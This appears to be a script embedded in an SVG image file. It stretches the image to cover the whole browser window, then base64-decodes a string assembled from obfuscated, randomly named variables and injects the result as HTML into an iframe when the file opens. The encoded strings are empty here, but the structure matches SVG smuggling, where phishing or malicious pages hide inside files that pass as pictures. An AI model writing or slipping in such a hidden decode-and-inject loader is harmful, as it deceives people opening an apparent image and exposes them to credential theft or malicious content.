svg.script:
setTimeout(function(){
  // Remove the scaling constraints when opened in a browser
  var svg = document.getElementById('mantle-svg');
  if (svg) {
    svg.removeAttribute('viewBox');
    svg.removeAttribute('preserveAspectRatio');
    svg.setAttribute('width', '100%');
    svg.setAttribute('height', '100%');
    svg.style.position = 'fixed';
    svg.style.inset = '0';
    svg.style.width = '100vw';
    svg.style.height = '100vh';
  }

  // Decode and inject the HTML
  var wfoizqcl="";var ftdodtvp="";var ledpmvfm="";var zczqdzqi="";var mhmentfm=wfoizqcl+ftdodtvp+ledpmvfm+zczqdzqi;var xwfcsqos=atob(mhmentfm);var oodlozht=new Uint8Array(xwfcsqos.length);for(var i=0;i<xwfcsqos.length;i++){oodlozht[i]=xwfcsqos.charCodeAt(i);}var d=new TextDecoder().decode(oodlozht);document.getElementById('f').srcdoc=d;
}(),50);
